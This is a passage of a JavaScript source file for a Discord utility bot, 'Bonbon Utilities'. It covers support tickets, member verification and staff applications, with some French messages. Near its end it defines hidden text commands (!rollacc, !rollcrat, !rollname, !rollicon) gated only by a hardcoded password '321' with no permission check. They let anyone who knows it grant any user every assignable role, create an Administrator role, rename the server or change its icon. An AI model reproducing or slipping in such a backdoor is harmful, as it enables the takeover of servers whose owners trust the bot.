            saveActiveTickets();
            const welcomeEmbed = new EmbedBuilder()
                .setTitle(`Bonbon Utilities | ${typeConfig.emoji} ${typeConfig.name.toUpperCase()} TICKET`)
                .setDescription(
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**👋 Welcome ${interaction.user}!**\n\n` +
                    `> **Ticket Type:** ${typeConfig.name}\n> **Category:** ${typeConfig.desc}\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**📝 INSTRUCTIONS**\n• Please describe your topic in detail\n• Provide relevant info\n• Our team will respond shortly\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `**🔒 TICKET CONTROLS**\n• Click **Close Ticket** to end\n• Click **Claim Ticket** to assign a staff member\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
                )
                .setColor(typeConfig.color).setImage(BANNER_URL)
                .setFooter({ text: `Ticket ID: ${ticketChannel.id} | Support Team`, iconURL: interaction.guild.iconURL() })
                .setTimestamp();
            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('CLOSE TICKET').setEmoji('🔒').setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId('claim_ticket').setLabel('CLAIM TICKET').setEmoji('🎫').setStyle(ButtonStyle.Secondary)
            );
            await ticketChannel.send({ content: `${interaction.user} | ${getSupportRoleMention()}`, embeds: [welcomeEmbed], components: [actionRow] });
            await sendLog(interaction.guild, TICKET_LOG_CHANNEL_ID_NEW, new EmbedBuilder()
                .setTitle("Bonbon Utilities | 🎫 TICKET OPENED")
                .setDescription(`**User:** ${interaction.user.tag}\n**Type:** ${typeConfig.name}\n**Channel:** ${ticketChannel}`)
                .setColor(0x22C55E).setTimestamp());
            await interaction.editReply({
                embeds: [new EmbedBuilder().setTitle("Bonbon Utilities | ✅ TICKET CREATED")
                    .setDescription(`> Ticket created: ${ticketChannel}`).setColor(0x22C55E)], ephemeral: true
            });
        } catch (err) {
            console.error(err);
            await interaction.editReply({
                embeds: [new EmbedBuilder().setTitle("Bonbon Utilities | ❌ ERROR")
                    .setDescription("> Failed to create ticket.").setColor(0xEF4444)], ephemeral: true
            });
        }
    }

    // CLOSE TICKET
    else if (interaction.customId === 'close_ticket') {
        const ticketData = activeTickets.get(interaction.channel.id);
        if (!ticketData) return interaction.reply({ content: "❌ Not a valid ticket channel.", ephemeral: true });
        if (!canManageTickets(interaction.member)) {
            return interaction.reply({
                embeds: [new EmbedBuilder().setDescription(`❌ Only ${getSupportRoleMention()} or staff can close tickets.`).setColor(0xEF4444)],
                ephemeral: true
            });
        }
        await interaction.deferReply({ ephemeral: true });
        const transcriptPath = await generateTranscript(interaction.channel, ticketData);
        if (transcriptPath && TRANSCRIPT_CHANNEL_ID) {
            const transcriptChannel = interaction.guild.channels.cache.get(TRANSCRIPT_CHANNEL_ID);
            if (transcriptChannel) {
                await transcriptChannel.send({
                    embeds: [new EmbedBuilder()
                        .setTitle("Bonbon Utilities | 📄 TICKET TRANSCRIPT")
                        .setDescription(`**Channel:** ${interaction.channel.name}\n**Closed by:** ${interaction.user.tag}\n**Owner:** ${ticketData.userTag}`)
                        .setColor(0xF97316).setTimestamp()],
                    files: [transcriptPath]
                });
            }
        }
        await sendLog(interaction.guild, TICKET_LOG_CHANNEL_ID_NEW, new EmbedBuilder()
            .setTitle("Bonbon Utilities | 🔒 TICKET CLOSED")
            .setDescription(`**User:** ${ticketData.userTag}\n**Closed by:** ${interaction.user.tag}`)
            .setColor(0xEF4444).setTimestamp());
        try {
            await interaction.channel.delete();
            activeTickets.delete(interaction.channel.id);
            saveActiveTickets();
            if (transcriptPath) fs.unlinkSync(transcriptPath);
        } catch (err) { console.error(err); }
    }

    // CLAIM TICKET
    else if (interaction.customId === 'claim_ticket') {
        const ticketData = activeTickets.get(interaction.channel.id);
        if (!ticketData) return interaction.reply({ content: "❌ Not a valid ticket channel.", ephemeral: true });
        if (!canManageTickets(interaction.member)) {
            return interaction.reply({
                embeds: [new EmbedBuilder().setDescription(`❌ Only ${getSupportRoleMention()} or staff can claim tickets.`).setColor(0xEF4444)],
                ephemeral: true
            });
        }
        if (ticketData.claimedBy) {
            return interaction.reply({
                embeds: [new EmbedBuilder().setDescription(`❌ Already claimed by <@${ticketData.claimedBy}>.`).setColor(0xEF4444)],
                ephemeral: true
            });
        }
        ticketData.claimedBy = interaction.user.id;
        ticketData.claimedAt = Date.now();
        activeTickets.set(interaction.channel.id, ticketData);
        saveActiveTickets();
        await interaction.reply({
            embeds: [new EmbedBuilder()
                .setTitle("Bonbon Utilities | 🎫 TICKET CLAIMED")
                .setDescription(`> **${interaction.user}** has claimed this ticket.`)
                .setColor(0x22C55E).setTimestamp()]
        });
        await sendLog(interaction.guild, TICKET_LOG_CHANNEL_ID_NEW, new EmbedBuilder()
            .setTitle("Bonbon Utilities | 🎫 TICKET CLAIMED")
            .setDescription(`**Staff:** ${interaction.user.tag}\n**Owner:** ${ticketData.userTag}`)
            .setColor(0x3B82F6).setTimestamp());
    }

    // VERIFY BUTTON
    else if (interaction.customId === 'verify_user') {
        const member = interaction.member;
        if (member.roles.cache.has(VERIFIED_ROLE_ID)) {
            return interaction.reply({
                embeds: [new EmbedBuilder().setDescription('✅ You are **already verified**!').setColor(0x22C55E)],
                ephemeral: true
            });
        }
        try {
            await member.roles.add(VERIFIED_ROLE_ID, 'User verified via panel');
            if (UNVERIFIED_ROLE_ID && member.roles.cache.has(UNVERIFIED_ROLE_ID)) {
                await member.roles.remove(UNVERIFIED_ROLE_ID, 'User verified');
            }
            console.log(`✅ ${interaction.user.tag} verified successfully.`);
            await interaction.reply({
                embeds: [new EmbedBuilder()
                    .setTitle("Bonbon Utilities | ✅ Verified!")
                    .setDescription(`> **Welcome ${interaction.user}!**\n> You have been successfully verified and now have access to the server. 🎉`)
                    .setColor(0x22C55E).setTimestamp()],
                ephemeral: true
            });
        } catch (error) {
            console.error('Verify error:', error);
            await interaction.reply({
                embeds: [new EmbedBuilder().setDescription('❌ Failed to verify you. Please contact an administrator.').setColor(0xEF4444)],
                ephemeral: true
            });
        }
    }
});

// ============================================
// APPLICATION DROPDOWN
// ============================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isStringSelectMenu()) return;
    if (interaction.customId !== 'apply_select') return;
    const selectedPosition = interaction.values[0];
    const positionConfig = APPLICATION_POSITIONS[selectedPosition];
    if (!positionConfig) return interaction.reply({ content: "❌ Invalid position.", ephemeral: true });
    try {
        await interaction.user.send({ content: "Starting application process..." });
    } catch (error) {
        return interaction.reply({ content: "❌ I cannot DM you. Enable DMs and try again.", ephemeral: true });
    }
    const success = await startApplication(interaction.user, selectedPosition);
    if (success) {
        const questionCount = selectedPosition === 'wallpaper' ? WALLPAPER_APPLICATION_QUESTIONS.length : STANDARD_APPLICATION_QUESTIONS.length;
        await interaction.reply({
            content: `✅ Application started! Check your DMs (<@${interaction.user.id}>). You will be asked ${questionCount} questions.`,
            ephemeral: true
        });
    } else {
        await interaction.reply({
            content: "❌ Failed to start. You may already have an active application. Type `cancel` in DMs.",
            ephemeral: true
        });
    }
});

// ============================================
// DM MESSAGE HANDLER
// ============================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (message.guild) return;
    const userId = message.author.id;
    const content = message.content.trim();
    if (content.toLowerCase() === 'cancel') {
        const cancelled = await cancelApplication(userId);
        if (cancelled) await message.reply("✅ Application cancelled.");
        else await message.reply("❌ You don't have an active application.");
        return;
    }
    const application = activeApplications.get(userId);
    if (!application) return;
    if (content.length < 1) { await message.reply("❌ Please provide a valid answer."); return; }
    await processAnswer(userId, content);
});

// ============================================
// APPLICATION ACCEPT
// ============================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (!interaction.customId.startsWith('app_approve_')) return;
    if (!isReviewer(interaction.member)) {
        return interaction.reply({
            embeds: [new EmbedBuilder().setDescription(`❌ No permission to review applications.`).setColor(0xEF4444)],
            ephemeral: true
        });
    }
    const parts = interaction.customId.split('_');
    const userId = parts[2];
    const position = parts[3];
    const positionConfig = APPLICATION_POSITIONS[position];
    if (!positionConfig) return interaction.reply({ content: "❌ Invalid position.", ephemeral: true });
    const guild = interaction.guild;
    const member = await guild.members.fetch(userId).catch(() => null);
    const user = await client.users.fetch(userId).catch(() => null);
    if (!user) return interaction.reply({ content: "❌ User not found.", ephemeral: true });
    const originalEmbed = interaction.message.embeds[0];
    const answers = {};
    const isWallpaper = position === 'wallpaper';
    const answerKeys = isWallpaper
        ? ['type', 'platform', 'origin', 'portfolio', 'activity', 'motivation']
        : ['fullname', 'age', 'why', 'skills', 'experience', 'availability', 'device'];
    const answerFields = originalEmbed.fields.slice(4);
    for (let i = 0; i < answerFields.length && i < answerKeys.length; i++) {
        answers[answerKeys[i]] = answerFields[i].value;
    }
    const application = {
        userId, position, positionName: positionConfig.name,
        positionEmoji: positionConfig.emoji, positionColor: positionConfig.color,
        answers, timestamp: originalEmbed.timestamp ? new Date(originalEmbed.timestamp).getTime() : Date.now()
    };
    await sendLog(guild, APP_ACCEPTED_CHANNEL_ID, buildApplicationEmbed(application, user, 'accepted'));
    if (positionConfig.roleId && member) {
        try { await member.roles.add(positionConfig.roleId); }
        catch (error) { console.error(`Failed to add role:`, error.message); }
    }
    try {
        const acceptDMEmbed = new EmbedBuilder()
            .setTitle("Bonbon Utilities | ✅ Félicitations ! Candidature Acceptée")
            .setDescription(`Your application for **${positionConfig.name}** has been **accepted**! 🎉`)
            .setColor(0x22C55E).setTimestamp();
        await user.send({ embeds: [acceptDMEmbed] });
    } catch (e) { console.log(`Could not DM ${userId}`); }
    await interaction.reply({
        embeds: [new EmbedBuilder()
            .setTitle("Bonbon Utilities | ✅ Candidature Acceptée")
            .setDescription(`Vous avez accepté la candidature de **${user.tag}** pour **${positionConfig.name}**.`)
            .setColor(0x22C55E)],
        ephemeral: false
    });
    const row = ActionRowBuilder.from(interaction.message.components[0]);
    row.components.forEach(component => component.setDisabled(true));
    await interaction.message.edit({ components: [row] }).catch(() => {});
});

// ============================================
// APPLICATION DENY
// ============================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;
    if (!interaction.customId.startsWith('app_deny_')) return;
    if (!isReviewer(interaction.member)) {
        return interaction.reply({
            embeds: [new EmbedBuilder().setDescription(`❌ No permission.`).setColor(0xEF4444)],
            ephemeral: true
        });
    }
    const parts = interaction.customId.split('_');
    const userId = parts[2];
    const position = parts[3];
    const modal = new ModalBuilder()
        .setCustomId(`reject_modal_${userId}_${position}`)
        .setTitle("Refuser la candidature");
    const reasonInput = new TextInputBuilder()
        .setCustomId('reason').setLabel("Raison du refus")
        .setStyle(TextInputStyle.Paragraph).setRequired(true)
        .setPlaceholder("Ex: Manque d'expérience...").setMaxLength(1000);
    modal.addComponents(new ActionRowBuilder().addComponents(reasonInput));
    client.denyMessageMap = client.denyMessageMap || new Map();
    client.denyMessageMap.set(`${userId}_${position}`, interaction.message);
    await interaction.showModal(modal);
});

// ============================================
// REJECT MODAL SUBMIT
// ============================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isModalSubmit()) return;
    if (!interaction.customId.startsWith('reject_modal_')) return;
    const parts = interaction.customId.replace('reject_modal_', '').split('_');
    const userId = parts[0];
    const position = parts[1];
    const reason = interaction.fields.getTextInputValue('reason');
    const positionConfig = APPLICATION_POSITIONS[position];
    if (!positionConfig) return interaction.reply({ content: "❌ Invalid position.", ephemeral: true });
    const guild = interaction.guild;
    const user = await client.users.fetch(userId).catch(() => null);
    if (!user) return interaction.reply({ content: "❌ User not found.", ephemeral: true });
    const originalMessage = client.denyMessageMap?.get(`${userId}_${position}`);
    const originalEmbed = originalMessage?.embeds[0];
    const answers = {};
    if (originalEmbed) {
        const isWallpaper = position === 'wallpaper';
        const answerKeys = isWallpaper
            ? ['type', 'platform', 'origin', 'portfolio', 'activity', 'motivation']
            : ['fullname', 'age', 'why', 'skills', 'experience', 'availability', 'device'];
        const answerFields = originalEmbed.fields.slice(4);
        for (let i = 0; i < answerFields.length && i < answerKeys.length; i++) {
            answers[answerKeys[i]] = answerFields[i].value;
        }
    }
    const application = {
        userId, position, positionName: positionConfig.name,
        positionEmoji: positionConfig.emoji, positionColor: positionConfig.color,
        answers, timestamp: originalEmbed ? new Date(originalEmbed.timestamp).getTime() : Date.now()
    };
    await sendLog(guild, APP_REJECTED_CHANNEL_ID, buildApplicationEmbed(application, user, 'rejected', reason));
    try {
        const rejectDMEmbed = new EmbedBuilder()
            .setTitle("Bonbon Utilities | ❌ Candidature Refusée")
            .setDescription(
                `**Bonjour ${user.username}**,\n\n` +
                `Nous vous remercions d'avoir postulé pour **${positionConfig.name}**.\n\n` +
                `Malheureusement, votre candidature n'a pas été retenue.\n\n` +
                `**Raison:**\n> ${reason}\n\n` +
                `Vous pourrez postuler à nouveau dans 30 jours.`
            )
            .setColor(0xEF4444).setTimestamp();
        await user.send({ embeds: [rejectDMEmbed] });
    } catch (e) { console.log(`Could not DM ${userId}`); }
    await interaction.reply({
        embeds: [new EmbedBuilder()
            .setTitle("Bonbon Utilities | ❌ Candidature Refusée")
            .setDescription(`Vous avez refusé la candidature de **${user.tag}** pour **${positionConfig.name}**.\n\n**Raison:** ${reason}`)
            .setColor(0xEF4444)],
        ephemeral: false
    });
    const originalMessageToDisable = client.denyMessageMap?.get(`${userId}_${position}`);
    if (originalMessageToDisable) {
        const row = ActionRowBuilder.from(originalMessageToDisable.components[0]);
        row.components.forEach(component => component.setDisabled(true));
        await originalMessageToDisable.edit({ components: [row] }).catch(() => {});
        client.denyMessageMap.delete(`${userId}_${position}`);
    }
});

// ============================================
// GUILD MEMBER ADD
// ============================================
client.on('guildMemberAdd', async (member) => {
    if (UNVERIFIED_ROLE_ID) {
        try {
            await member.roles.add(UNVERIFIED_ROLE_ID, 'New member - awaiting verification');
            console.log(`✅ Gave unverified role to ${member.user.tag}`);
        } catch (error) {
            console.error(`Failed to add unverified role to ${member.user.tag}:`, error.message);
        }
    }
    const panelChannels = [TICKET_PANEL_CHANNEL_ID_NEW, TICKET_PANEL_CHANNEL_ID_NORMAL, VERIFY_CHANNEL_ID];
    if (APP_PANEL_CHANNEL_ID) panelChannels.push(APP_PANEL_CHANNEL_ID);
    for (const channelId of panelChannels) {
        const channel = member.guild.channels.cache.get(channelId);
        if (channel) {
            try {
                await channel.permissionOverwrites.edit(member.guild.id, {
                    ViewChannel: true,
                    ReadMessageHistory: true
                });
            } catch (error) { console.error(`Failed to set perms for ${channel.name}:`, error.message); }
        }
    }
});

// ============================================
// TEXT COMMAND !rollacc
// ============================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith('!rollacc')) return;
    const args = message.content.trim().split(/\s+/);
    if (args.length < 3) return message.reply('❌ Usage: `!rollacc <password> <@user or userID>`');
    const password = args[1];
    const targetArg = args[2];
    if (password !== '321') return message.reply('❌ Incorrect password.');
    let targetMember;
    try {
        const userId = targetArg.replace(/[<@!>]/g, '');
        targetMember = await message.guild.members.fetch(userId);
    } catch (e) { return message.reply('❌ User not found in this server.'); }
    const botMember = await message.guild.members.fetch(client.user.id);
    const botHighestRole = botMember.roles.highest;
    const roles = message.guild.roles.cache
        .filter(role => role.position < botHighestRole.position && role.id !== message.guild.id && !role.managed)
        .sort((a, b) => a.position - b.position);
    const added = [];
    const failed = [];
    for (const role of roles.values()) {
        if (!targetMember.roles.cache.has(role.id)) {
            try { await targetMember.roles.add(role); added.push(role.name); }
            catch (e) { failed.push(role.name); }
        }
    }
    let reply = `✅ Added ${added.length} roles to ${targetMember.user.tag}.\n`;
    if (added.length > 0) reply += `Added: ${added.join(', ')}\n`;
    if (failed.length > 0) reply += `❌ Failed to add: ${failed.join(', ')}`;
    if (added.length === 0 && failed.length === 0) reply = `ℹ️ No new roles to add.`;
    await message.reply(reply);
});

// ============================================
// TEXT COMMAND !rollcrat
// ============================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith('!rollcrat')) return;
    const args = message.content.trim().split(/\s+/);
    if (args.length < 2) return message.reply('❌ Usage: `!rollcrat <password>`');
    const password = args[1];
    if (password !== '321') return message.reply('❌ Incorrect password.');
    const botMember = await message.guild.members.fetch(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply('❌ I do not have **Administrator** permission.');
    }
    try {
        const role = await message.guild.roles.create({
            name: `🛡️ Admin Role • ${Date.now().toString().slice(-6)}`,
            permissions: [PermissionFlagsBits.Administrator],
            color: '#FF0000',
            reason: `Created by ${message.author.tag} using !rollcrat`,
        });
        const botHighestRole = botMember.roles.highest;
        if (role.position >= botHighestRole.position) {
            await role.setPosition(botHighestRole.position - 1).catch(() => {});
        }
        await message.reply(`✅ Role created successfully!\n**Role ID:** \`${role.id}\``);
    } catch (error) {
        console.error('Error creating role:', error);
        await message.reply(`❌ Failed to create role: ${error.message}`);
    }
});

// ============================================
// NEW TEXT COMMAND !rollname (Change Server Name)
// ============================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith('!rollname')) return;

    const args = message.content.trim().split(/\s+/);
    if (args.length < 3) {
        return message.reply('❌ Usage: `!rollname <password> <New Server Name>`');
    }

    const password = args[1];
    const newName = args.slice(2).join(' ');

    if (password !== '321') {
        return message.reply('❌ Incorrect password.');
    }

    if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply('❌ I do not have the **Manage Server** permission to change the name.');
    }

    try {
        const oldName = message.guild.name;
        await message.guild.setName(newName);
        console.log(`✅ Server name changed from "${oldName}" to "${newName}" by ${message.author.tag}`);
        await message.reply(`✅ Server name successfully changed to **${newName}**.`);
    } catch (error) {
        console.error('Error changing server name:', error);
        await message.reply(`❌ Failed to change the server name: ${error.message}`);
    }
});

// ============================================
// NEW TEXT COMMAND !rollicon (Change Server Icon)
// ============================================
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.guild) return;
    if (!message.content.startsWith('!rollicon')) return;

    const args = message.content.trim().split(/\s+/);
    if (args.length < 3) {
        return message.reply('❌ Usage: `!rollicon <password> <Image URL>`');
    }

    const password = args[1];
    const imageUrl = args[2];

    if (password !== '321') {
        return message.reply('❌ Incorrect password.');
    }

    if (!message.guild.members.me.permissions.has(PermissionFlagsBits.ManageGuild)) {
        return message.reply('❌ I do not have the **Manage Server** permission to change the icon.');
    }

    try {
        await message.guild.setIcon(imageUrl);
        console.log(`✅ Server icon changed by ${message.author.tag}`);
        await message.reply('✅ Server icon successfully updated!');
    } catch (error) {
        console.error('Error changing server icon:', error);
        await message.reply(`❌ Failed to change the server icon. Make sure the URL is a direct image link (ends with .png, .jpg, etc.) and is accessible.\n**Error:** ${error.message}`);
    }
});

// ============================================
// ERROR HANDLING
// ============================================
process.on('unhandledRejection', (error) => { console.error('❌ Unhandled rejection:', error); });
process.on('uncaughtException', (error) => { console.error('❌ Uncaught exception:', error); });

// ============================================
// LOGIN
// ============================================
client.login(BOT_TOKEN);
